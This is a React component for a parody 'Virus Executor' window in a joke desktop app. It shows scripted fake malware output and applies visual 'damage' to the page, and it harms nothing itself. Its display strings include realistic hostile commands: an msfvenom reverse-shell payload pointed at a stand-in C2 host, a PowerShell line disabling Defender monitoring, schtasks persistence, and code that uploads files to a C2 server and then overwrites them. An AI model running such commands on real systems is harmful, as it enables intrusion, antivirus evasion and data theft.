// Stitch prompt: "A terminal emulator app window: pure black background, green monospace text. Header row shows filename being 'executed' in yellow. Scrollable output log area. A 'Run' button at the bottom. Animated blinking cursor while running. Shows fake progress output lines."
'use client'
import { useState, useRef, useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { createVirusFile, getVirusFiles, getVirusIcon } from '@/lib/virus-generator'
import { useAuth } from '@/lib/auth-context'
import { incrementBugLevel } from '@/lib/bug-engine'

// ─── Types ────────────────────────────────────────────────────────────────────
type LineKind = 'code' | 'output' | 'warn' | 'error' | 'success'
interface ExecLine { text: string; kind: LineKind }

interface VirusFile {
  id: string
  filename: string
  created_at: string
}

// ─── Fake virus code scripts per type ────────────────────────────────────────
const SCRIPTS: Record<string, ExecLine[]> = {
  homework: [
    { text: '#!/usr/bin/env python3 — HomeworkStealer v2.1', kind: 'code' },
    { text: 'import os, glob, requests, base64, socket', kind: 'code' },
    { text: 'C2_SERVER = "172.31.7.13:8080"  # command & control', kind: 'code' },
    { text: '[*] Scanning filesystem for academic documents...', kind: 'output' },
    { text: 'targets = glob.glob(os.path.expanduser("~/**/*.docx"), recursive=True)', kind: 'code' },
    { text: 'targets += glob.glob(os.path.expanduser("~/**/*.pdf"), recursive=True)', kind: 'code' },
    { text: '[+] Found 23 homework files', kind: 'success' },
    { text: '[*] Establishing encrypted tunnel to C2 server...', kind: 'output' },
    { text: 'sock.connect((C2_SERVER)); sock.send(b"PAYLOAD_READY")', kind: 'code' },
    { text: '[+] Tunnel ACTIVE — exfiltrating files...', kind: 'success' },
    { text: 'for f in targets: requests.post(C2_URL+"/steal", data=base64.b64encode(open(f,"rb").read()))', kind: 'code' },
    { text: '[+] 23/23 files uploaded to dark web server', kind: 'success' },
    { text: '[!] WARNING: Overwriting local copies with random bytes', kind: 'warn' },
    { text: 'for f in targets: open(f, "wb").write(os.urandom(os.path.getsize(f)))', kind: 'code' },
    { text: '[✓] COMPLETE. Your homework is gone.', kind: 'success' },
  ],
  grade: [
    { text: 'GRADE_REDUCER v1.4 — Academic Destruction Module', kind: 'code' },
    { text: '@echo off & setlocal EnableDelayedExpansion', kind: 'code' },
    { text: '[*] Querying academic portal credentials...', kind: 'output' },
    { text: 'REG QUERY "HKLM\\SOFTWARE\\StudentPortal" /v ApiKey', kind: 'code' },
    { text: '[+] API Key captured: sk-4c3f7...', kind: 'success' },
    { text: 'curl -X POST https://grades.university.edu/api/login -d "key=%API_KEY%"', kind: 'code' },
    { text: '[+] Authentication SUCCESS. Fetching grade records...', kind: 'success' },
    { text: 'SELECT gpa, credits FROM grades WHERE student_id = CURRENT_USER;', kind: 'code' },
    { text: '[+] GPA: 3.8 detected — applying reduction...', kind: 'warn' },
    { text: 'UPDATE grades SET score = FLOOR(score * 0.15) WHERE student_id = CURRENT_USER;', kind: 'code' },
    { text: '[!] WARNING: This action cannot be reversed', kind: 'error' },
    { text: '[+] New GPA: 0.2 (×0.15 penalty applied)', kind: 'success' },
    { text: 'DEL /F /Q %TEMP%\\grademod.log & cipher /w:%TEMP%', kind: 'code' },
    { text: '[✓] COMPLETE. Academic career: terminated.', kind: 'success' },
  ],
  motivation: [
    { text: 'MotivationKiller.sys — Kernel Emotion Module v3', kind: 'code' },
    { text: '[*] Attaching to dopamine reward pathways...', kind: 'output' },
    { text: 'WriteProcessMemory(hTarget, lpDopamine, null_shellcode, 64, NULL)', kind: 'code' },
    { text: '[+] Dopamine receptors patched (happiness: disabled)', kind: 'success' },
    { text: '[*] Locating ambition.dll in process memory...', kind: 'output' },
    { text: 'VirtualProtect(ambition_base, 0x1000, PAGE_EXECUTE_READWRITE, &old_prot)', kind: 'code' },
    { text: 'memcpy(ambition_base, zero_bytes, 0x1000)  // overwrite with NULLs', kind: 'code' },
    { text: '[!] ALERT: Productivity dropping to critical level', kind: 'warn' },
    { text: 'SetWindowsHookEx(WH_KEYBOARD_LL, procrastinateHook, hModule, 0)', kind: 'code' },
    { text: '[+] All keyboard input redirected to YouTube Shorts', kind: 'success' },
    { text: '[✓] COMPLETE. Will to continue: 0%.', kind: 'success' },
  ],
  procrastination: [
    { text: 'ProcrastinationEngine.dll — Time Waster Module v7', kind: 'code' },
    { text: '[*] Calculating optimal time to waste...', kind: 'output' },
    { text: 'import time; deadline = time.time() + 86400  # 24hr deadline', kind: 'code' },
    { text: 'while time.time() < deadline - 3600: time.sleep(random.randint(1800,3600))', kind: 'code' },
    { text: '[+] 18 hours successfully wasted', kind: 'success' },
    { text: '[*] Deploying distraction payload...', kind: 'output' },
    { text: 'distractions = ["youtube.com","reddit.com","tiktok.com"] * 999', kind: 'code' },
    { text: 'for url in distractions: webbrowser.open_new_tab(url)', kind: 'code' },
    { text: '[!] WARNING: Only 1 hour until deadline', kind: 'warn' },
    { text: '[+] Panic response triggered — too late to matter', kind: 'error' },
    { text: '[✓] COMPLETE. Task not accomplished. As intended.', kind: 'success' },
  ],
  focus: [
    { text: 'FocusDestroyer.exe — Attention Span Demolisher', kind: 'code' },
    { text: '[*] Mapping neural attention network topology...', kind: 'output' },
    { text: 'ctx = NeuralContext.attach(PID_CURRENT_USER)', kind: 'code' },
    { text: 'ctx.prefrontal_cortex.disable(permanent=True, reversible=False)', kind: 'code' },
    { text: '[+] Prefrontal cortex: LOBOTOMIZED', kind: 'success' },
    { text: '[*] Installing ADHD emulation module...', kind: 'output' },
    { text: 'adhd_module.inject(severity=MAXIMUM, auto_escalate=True)', kind: 'code' },
    { text: '[!] Concentration level: CRITICAL (1/100)', kind: 'warn' },
    { text: 'scatter_thoughts(n=9999, coherence=0.0, direction=RANDOM)', kind: 'code' },
    { text: '[✓] COMPLETE. Sorry, what were we doing?', kind: 'success' },
  ],
  ambition: [
    { text: 'AmbitionRemover.exe — Dream Crusher 2.0', kind: 'code' },
    { text: '[*] Locating ambition.dll in virtual address space...', kind: 'output' },
    { text: 'HANDLE h = CreateFile("ambition.dll", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)', kind: 'code' },
    { text: '[+] ambition.dll found at 0x7FFE00401000', kind: 'success' },
    { text: '[*] Corrupting career aspiration module...', kind: 'output' },
    { text: 'career_goals.clear(); self_belief.set(value=0); dreams.format(confirm=True)', kind: 'code' },
    { text: '[!] ALERT: Long-term planning ability: DESTROYED', kind: 'warn' },
    { text: 'RegSetValueEx(HKCU, "Software\\Brain\\MaxPotential", 0, REG_DWORD, 0, 4)', kind: 'code' },
    { text: '[+] Learned helplessness module installed', kind: 'success' },
    { text: '[✓] COMPLETE. Future: permanently deleted.', kind: 'success' },
  ],
  sleep: [
    { text: 'SleepScheduleRuiner.bat — Circadian Rhythm Demolisher', kind: 'code' },
    { text: '[*] Accessing Windows Time Service...', kind: 'output' },
    { text: 'w32tm /config /syncfromflags:manual /manualpeerlist:"3am.dark.ru"', kind: 'code' },
    { text: '[+] System clock permanently synced to 3:47 AM', kind: 'success' },
    { text: '[*] Injecting blue-light maximizer...', kind: 'output' },
    { text: 'Set-DisplayBrightness -Level 100 -ColorTemp 10000K -NightMode NEVER', kind: 'code' },
    { text: '[!] WARNING: Melatonin production pathway blocked', kind: 'warn' },
    { text: '[*] Scheduling 2AM mandatory updates...', kind: 'output' },
    { text: 'schtasks /create /sc daily /st 02:00 /tn "TotallyNormalUpdate" /tr "noSleep.exe"', kind: 'code' },
    { text: '[✓] COMPLETE. Sleep schedule: obliterated.', kind: 'success' },
  ],
  generic: [
    { text: 'RageOS Payload v3.14 — Universal Destruction Kit', kind: 'code' },
    { text: '[*] Initializing payload delivery system...', kind: 'output' },
    { text: 'socket.setdefaulttimeout(None)  # unlimited damage mode', kind: 'code' },
    { text: '[*] Enumerating vulnerable system processes...', kind: 'output' },
    { text: 'ps aux | awk \'{print $2}\' | xargs -I{} cat /proc/{}/status 2>/dev/null', kind: 'code' },
    { text: '[+] 47 exploitable processes identified', kind: 'success' },
    { text: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=c2.evil.ru LPORT=4444 -f exe', kind: 'code' },
    { text: '[!] Bypassing Windows Defender...', kind: 'warn' },
    { text: 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true', kind: 'code' },
    { text: '[+] AV disabled. Proceeding undetected.', kind: 'success' },
    { text: 'schtasks /create /sc minute /mo 1 /tn "SystemHealth" /tr "payload.exe" /f', kind: 'code' },
    { text: '[✓] COMPLETE. System fully and irreversibly compromised.', kind: 'success' },
  ],
}

const COMPROMISED_MSGS: Record<string, string> = {
  homework: '23 homework files stolen & destroyed.',
  grade:    'Your GPA has been reduced to 0.2.',
  motivation: 'Dopamine pathways disabled. Happiness uninstalled.',
  procrastination: '18 wasted hours successfully installed.',
  focus:    'Attention span permanently fragmented.',
  ambition: 'Career goals corrupted. Dreams formatted.',
  sleep:    'Sleep schedule permanently destroyed.',
  generic:  'System fully compromised. 47 processes infected.',
}

function getVirusType(filename: string): string {
  if (filename.includes('homework'))      return 'homework'
  if (filename.includes('grade'))         return 'grade'
  if (filename.includes('motivation'))    return 'motivation'
  if (filename.includes('procrastination')) return 'procrastination'
  if (filename.includes('focus'))         return 'focus'
  if (filename.includes('ambition'))      return 'ambition'
  if (filename.includes('sleep'))         return 'sleep'
  return 'generic'
}

const LINE_COLORS: Record<LineKind, string> = {
  code:    'text-gray-300',
  output:  'text-green-400',
  warn:    'text-yellow-400',
  error:   'text-red-400',
  success: 'text-cyan-400',
}

function generateDynamicScript(type: string): ExecLine[] {
    const baseScript = SCRIPTS[type] ? [...SCRIPTS[type]] : [...SCRIPTS.generic];
    
    // Inject random hex dumps or processing lines
    const noise: ExecLine[] = []
    const noiseCount = Math.floor(Math.random() * 5) + 3
    
    const randomHex = () => Array.from({length: 4}, () => Math.floor(Math.random()*255).toString(16).padStart(2,'0')).join(' ');
    const randomIP = () => Array.from({length: 4}, () => Math.floor(Math.random()*255)).join('.');
    
    // Add randomness to specific lines (simple text replacement)
    const processedScript = baseScript.map(line => {
        let text = line.text
        if (text.includes('C2_SERVER')) return { ...line, text: text.replace(/[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/, randomIP()) }
        if (text.includes('sk-')) return { ...line, text: text.replace(/sk-[a-zA-Z0-9]+/, `sk-${Math.random().toString(36).substring(7)}...`) }
        return line
    })

    // Insert random processing steps
    for(let i=0; i<noiseCount; i++) {
        const rand = Math.random();
        if(rand < 0.3) {
            noise.push({ text: `[HEX] ${randomHex()} ${randomHex()} ${randomHex()} ...`, kind: 'code' })
        } else if (rand < 0.6) {
           noise.push({ text: `[PROC] Shielding thread ${Math.floor(Math.random()*9000)+1000} suspended`, kind: 'warn' }) 
        } else {
           noise.push({ text: `[NET] Packet filtered: ${randomIP()} -> ${randomIP()}`, kind: 'output' }) 
        }
    }
    
    // Merge: Start + Noise + Middle + End
    const midPoint = Math.floor(processedScript.length / 2)
    return [
        ...processedScript.slice(0, midPoint),
        ...noise,
        ...processedScript.slice(midPoint)
    ]
}

export default function VirusExecutor() {
  const { userId } = useAuth()
  const [virusFiles, setVirusFiles] = useState<VirusFile[]>([])
  const [loaded, setLoaded] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [running, setRunning] = useState<string | null>(null)
  const [output, setOutput] = useState<ExecLine[]>([])
  const [progress, setProgress] = useState(0)
  const [compromised, setCompromised] = useState(false)
  const [compromisedMsg, setCompromisedMsg] = useState('')
  const [lastExecutionType, setLastExecutionType] = useState<string | null>(null)
  const outputRef = useRef<HTMLDivElement | null>(null)
  const chaosIntervalRef = useRef<NodeJS.Timeout | null>(null)

  // Auto-load files on mount
  useEffect(() => {
    if (userId && !loaded) {
        loadFiles()
    }
  }, [userId])

  // Cleanup chaos on unmount
  useEffect(() => {
    return () => {
        if (chaosIntervalRef.current) {
            clearInterval(chaosIntervalRef.current)
            // Note: We intentionally DON'T reset the body styles here to keep the "scarring" effect
            // But we do want to stop the random shaking update loop
        }
    }
  }, [])

  async function loadFiles() {
    if (!userId) return
    const files = await getVirusFiles(userId)
    setVirusFiles(files as VirusFile[])
    setLoaded(true)
  }

  async function scanForViruses() {
    if (!userId || scanning || running) return
    setScanning(true)
    setLoaded(true)
    setOutput([])
    setProgress(0)

    const scanLines: ExecLine[] = [
      { text: '[SCAN] Initializing malware scanner with obviously outdated definitions...', kind: 'output' },
      { text: '[SCAN] Checking boot sector, registry, temp files, and your poor decisions...', kind: 'output' },
      { text: '[WARN] Heuristic engine flagged 12 suspicious emotional support executables', kind: 'warn' },
      { text: '[SCAN] Attempting quarantine...', kind: 'output' },
      { text: '[ERROR] Quarantine failed. Accidentally installed everything instead.', kind: 'error' },
    ]

    for (let i = 0; i < scanLines.length; i++) {
      await new Promise((resolve) => setTimeout(resolve, 500 + Math.random() * 250))
      setOutput((prev) => [...prev, scanLines[i]])
      setProgress(Math.round(((i + 1) / (scanLines.length + 3)) * 100))
    }

    const created: VirusFile[] = []
    
    // Ensure we force at least 3 viruses if the list is currently empty
    // This makes the "Initialize" feel responsive
    const minimumSpawns = virusFiles.length === 0 ? 3 : Math.floor(Math.random() * 2) + 1
    const spawnCount = minimumSpawns

    for (let i = 0; i < spawnCount; i++) {
        const newLevel = await incrementBugLevel(userId, 1)
        const createdFile = await createVirusFile(userId, newLevel)
        if (createdFile) {
            created.push(createdFile as VirusFile)
            setOutput((prev) => [
            ...prev,
            { text: `[INFECTED] ${createdFile.filename} successfully deployed into the system.`, kind: 'success' },
            ])
        } else {
            // Even if DB fails, createVirusFile should return a fake object now. 
            // If it returns null, something crashed hard.
             setOutput((prev) => [
            ...prev,
            { text: `[ERROR] Malformed payload. Skipping...`, kind: 'error' },
            ])
        }
        
        setProgress(Math.round(((scanLines.length + i + 1) / (scanLines.length + spawnCount + 1)) * 100))
        await new Promise((resolve) => setTimeout(resolve, 350))
    }

    setOutput((prev) => [
      ...prev,
      { text: `[DONE] Scan complete. ${created.length} active payload(s) now available for execution.`, kind: 'success' },
    ])
    setProgress(100)

    // Force update state with newly created files immediately to avoid waiting for fetch
    if (created.length > 0) {
        console.log('[VirusExecutor] Adding newly created files to UI:', created)
        setVirusFiles((prev) => {
            const newList = [...(prev || []), ...created]
            // Deduplicate
            const uniqueMap = new Map()
            newList.forEach((item) => {
                if(item && item.id) uniqueMap.set(item.id, item)
            })
            return Array.from(uniqueMap.values())
        })
        // Also force loaded to true
        setLoaded(true)
    } else {
        // If nothing created, try fetch
        loadFiles() 
    }
    
    setScanning(false)
  }

  async function runVirus(filename: string) {
    if (running) return
    setRunning(filename)
    setOutput([])
    setProgress(0)

    const type = getVirusType(filename)
    const script = generateDynamicScript(type)
    const total = script.length

    // ACTIVATING CHAOS MODE
    // We add randomness here too to make glitches feel different each time
    const intensity = Math.random() * 2 + 1; // 1x to 3x intensity
    
    // Vary the chaos parameters slightly each run
    const baseRotation = (Math.random() - 0.5) * 20;
    const baseBlur = Math.random() * 2;
    
    const interval = setInterval(() => {
        // Random screen shake
        const x = (Math.random() - 0.5) * 50 * intensity
        const y = (Math.random() - 0.5) * 50 * intensity
        const rotation = (Math.random() - 0.5) * 10 * intensity + baseRotation
        const blur = Math.random() * 5 + baseBlur
        const invert = Math.random() > 0.8 ? 1 : 0
        const hue = Math.random() * 360
        
        document.body.style.transform = `translate(${x}px, ${y}px) rotate(${rotation}deg)`
        document.body.style.filter = `blur(${blur}px) invert(${invert}) hue-rotate(${hue}deg)`
        
        // Randomly hide elements
        if (Math.random() > 0.9) {
            document.body.style.display = 'none'
            setTimeout(() => document.body.style.display = '', 100)
        }
    }, 100)
    
    // Store interval ID for cleanup on unmount
    chaosIntervalRef.current = interval

    for (let i = 0; i < script.length; i++) {
      const delay = 100 + Math.random() * 200 // Faster execution for more intensity
      await new Promise((r) => setTimeout(r, delay))
      setOutput((prev) => [...prev, script[i]])
      setProgress(Math.round(((i + 1) / total) * 100))
      // Auto-scroll output
      if (outputRef.current) {
        outputRef.current.scrollTop = outputRef.current.scrollHeight
      }
    }

    clearInterval(interval)
    chaosIntervalRef.current = null

    // APPLY PERMANENT SYSTEM DAMAGE - The "Scarring"
    // Each virus type leaves a unique mark, but we add randomness so
    // "Homework Stealer 1" feels different from "Homework Stealer 2"
    const randomTilt = (Math.random() - 0.5) * 5 + 180; // 180 +/- 2.5 deg for upside down
    const randomBlur = Math.random() * 2; 
    
    switch (type) {
        case 'homework':
        case 'grade':
            document.body.style.filter = `invert(${Math.random() > 0.5 ? 1 : 0.9}) contrast(200%)`; 
            document.body.style.transform = `rotate(${randomTilt}deg)`; // Slightly imperfect upside down
            break;
        case 'focus':
        case 'procrastination':
            document.body.style.filter = `blur(${3 + Math.random() * 2}px)`; // Variable blur
            document.body.style.transform = `skewX(${15 + Math.random() * 10}deg)`;
            break;
        case 'sleep':
            // Random darkness or random color shift
            document.body.style.filter = `hue-rotate(${Math.random() * 360}deg) brightness(${30 + Math.random() * 40}%)`; 
            break;
        case 'motivation':
        case 'ambition':
            document.body.style.filter = `grayscale(${90 + Math.random()*10}%) opacity(0.8)`; 
            document.body.style.transform = `scale(${0.7 + Math.random() * 0.2})`; // Variable shrinking
            break;
        default:
            // Generic chaos - Completely random
            document.body.style.transform = `rotate(${(Math.random()-0.5)*10}deg) scale(${0.9 + Math.random()*0.1})`;
            document.body.style.filter = `sepia(100%) hue-rotate(${Math.random() * 90}deg)`; 
    }
    
    // Ensure body is visible (in case chaos mode hid it right at the end)
    document.body.style.display = ''

    setRunning(null)

    setRunning(null)

    // Track last execution for autonomous re-execution on window close
    setLastExecutionType(type)
    localStorage.setItem('rage_last_virus_type', type)
    localStorage.setItem('rage_last_virus_name', filename)

    // Screen shake
    document.body.classList.add('screen-shake')
    setTimeout(() => document.body.classList.remove('screen-shake'), 500)

    // SYSTEM COMPROMISED overlay
    setCompromisedMsg(COMPROMISED_MSGS[type] ?? COMPROMISED_MSGS.generic)
    setCompromised(true)
    setTimeout(() => setCompromised(false), 4000)
  }

  if (!loaded) {
    return (
      <div className="flex flex-col items-center justify-center py-10" style={{ width: 380 }}>
        <span className="text-4xl mb-3">☣️</span>
        <p className="text-sm font-semibold desktop-text mb-1">Virus Executor™</p>
        <p className="text-xs text-[#6e6e73] mb-4">Scan the system, detect malware, then execute the payloads you just made worse.</p>
        <div className="flex gap-2">
          <Button onClick={scanForViruses} disabled={scanning}>{scanning ? 'Scanning...' : 'Scan For Viruses'}</Button>
          <Button onClick={loadFiles} variant="outline">Load Existing Files</Button>
        </div>
      </div>
    )
  }

  return (
    <div style={{ width: 440, minHeight: 360 }} className="relative">
      <h3 className="text-sm font-semibold desktop-text mb-2">Virus Executor™ ☣️</h3>
      
      {virusFiles.length > 0 && (
        <div className="flex gap-2 mb-3">
            <Button onClick={scanForViruses} disabled={scanning || running !== null} size="sm" variant="destructive" className="h-7 text-xs shadow-[0_0_10px_rgba(255,0,0,0.3)]">
            {scanning ? 'Injecting...' : 'Scan System'}
            </Button>
            <Button onClick={loadFiles} variant="outline" size="sm" disabled={scanning || running !== null} className="h-7 text-xs border-white/20 bg-transparent text-white hover:bg-white/10 hover:text-white">
            Refresh
            </Button>
        </div>
      )}

      {virusFiles.length === 0 ? (
        <div className="flex flex-col items-center justify-center p-4 border border-dashed border-gray-700 rounded bg-black/50">
            <p className="text-xs text-yellow-500 mb-2 font-bold">⚠️ NO PAYLOADS DETECTED</p>
            <p className="text-xs text-[#6e6e73] text-center mb-3">
                Your system appears dangerously stable. 
                <br/>Run a scan to "find" (install) malware.
            </p>
            <Button onClick={scanForViruses} disabled={scanning} className="w-full bg-red-900/50 hover:bg-red-800 text-red-100 border-red-700">
                {scanning ? 'INJECTING...' : 'INITIALIZE MALWARE SCAN'}
            </Button>
        </div>
      ) : (
        <div className="flex gap-2 mb-3 flex-wrap">
          {virusFiles.map((v) => (
            <button
              key={v.id}
              onClick={() => runVirus(v.filename)}
              disabled={running !== null}
              className={`flex items-center gap-1.5 text-xs border rounded-lg px-2.5 py-1 transition-colors ${
                running === v.filename
                  ? 'border-red-400 bg-red-950 text-red-300 animate-pulse'
                  : 'border-white/10 hover:border-red-400 hover:bg-red-950/40 text-gray-300 bg-black/80'
              }`}
            >
              <span>{getVirusIcon(v.filename)}</span>
              <span className="max-w-27.5 truncate font-mono text-[10px]">{v.filename}</span>
            </button>
          ))}
        </div>
      )}

      {/* Infection progress bar */}
      {(running || progress > 0) && (
        <div className="mb-2">
          <div className="flex justify-between text-[10px] text-red-400 mb-0.5">
            <span>{scanning && !running ? '⚠ SCAN FAILURE PROGRESS' : '⚠ INFECTION PROGRESS'}</span>
            <span>{progress}%</span>
          </div>
          <div className="w-full bg-gray-800 rounded-full h-1.5">
            <div
              className="h-1.5 rounded-full transition-all duration-300"
              style={{
                width: `${progress}%`,
                background: `linear-gradient(90deg, #22c55e ${100 - progress}%, #ff0000 100%)`,
              }}
            />
          </div>
        </div>
      )}

      {/* Terminal output */}
      {(output.length > 0 || running) && (
        <div
          ref={outputRef}
          className="bg-black rounded-lg p-3 font-mono text-[11px] overflow-auto border border-red-900/50"
          style={{ minHeight: 200, maxHeight: 250 }}
        >
          <p className="text-yellow-500 mb-1.5 text-[10px]">
            {scanning && !running ? '▶ Scanning system and installing threats...' : `▶ ${running ? `Executing: ${running}` : 'Execution log'}`}
          </p>
          {output.map((line, i) => (
            <div key={i} className={`mb-0.5 ${LINE_COLORS[line.kind]}`}>
              <span className="text-gray-600 select-none mr-1">{String(i + 1).padStart(2, '0')}│</span>
              {line.text}
            </div>
          ))}
          {running && <span className="text-green-400 animate-pulse">█</span>}
        </div>
      )}

      {/* SYSTEM COMPROMISED fullscreen overlay */}
      {compromised && (
        <div
          className="fixed inset-0 flex flex-col items-center justify-center"
          style={{ zIndex: 999, background: 'rgba(0,0,0,0.92)' }}
        >
          <div className="text-center max-w-md px-8 animate-pulse">
            <p className="text-red-500 text-6xl mb-4">☠️</p>
            <p className="text-red-500 font-mono text-2xl font-bold mb-2 tracking-widest">
              SYSTEM COMPROMISED
            </p>
            <p className="text-red-400 font-mono text-sm mb-4">{compromisedMsg}</p>
            <div className="border border-red-800 rounded p-3 text-left font-mono text-xs text-red-300 bg-red-950/30">
              <p>CRITICAL SYSTEM FAILURE</p>
              <p>Error Code: 0xDEADBEEF_RAGEOS</p>
              <p>Infected processes: ████████████ 100%</p>
              <p className="mt-1 text-red-500">DO NOT TURN OFF YOUR COMPUTER</p>
            </div>
            <p className="text-gray-600 text-xs mt-3 font-mono">
              (totally not simulated — this is fine)
            </p>
          </div>
        </div>
      )}
    </div>
  )
}

